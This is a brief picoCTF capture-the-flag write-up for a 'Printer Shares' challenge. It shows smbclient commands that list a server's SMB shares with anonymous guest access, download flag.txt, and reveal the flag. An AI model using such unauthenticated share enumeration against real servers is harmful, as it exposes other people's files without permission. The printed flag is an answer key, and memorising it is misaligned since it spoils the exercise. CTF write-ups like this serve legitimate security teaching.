
# Reto 
### Printer Shares
## Descripcion
Oops! Someone accidentally sent an important file to a network printer—can you retrieve it from the print server?The printer is on `60704`.you can try `$ nc -vz mysterious-sea.picoctf.net 60704`
## Solucion
```
Aaxel0583-picoctf@webshell:~$ smbclient -L //mysterious-sea.picoctf.net -p 49827 -N

        Sharename       Type      Comment
        ---------       ----      -------
        shares          Disk      Public Share With Guests
        IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
SMB1 disabled -- no workgroup available
Aaxel0583-picoctf@webshell:~$ ls
README.txt  capture.pcap  picopico.key
Aaxel0583-picoctf@webshell:~$ smbclient //mysterious-sea.picoctf.net/shares -p 49827 -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar  6 20:25:46 2026
  ..                                  D        0  Fri Mar  6 20:25:46 2026
  dummy.txt                           N     1142  Wed Feb  4 21:22:17 2026
  flag.txt                            N       37  Fri Mar  6 20:25:46 2026

                65536 blocks of size 1024. 58232 blocks available
smb: \> get flag.txt
getting file \flag.txt of size 37 as flag.txt (18.1 KiloBytes/sec) (average 18.1 KiloBytes/sec)
smb: \> cat flag.txt 
cat: command not found
smb: \> exit
Aaxel0583-picoctf@webshell:~$ cat flag.txt 
picoCTF{5mb_pr1nter_5h4re5_78a2840d}
```


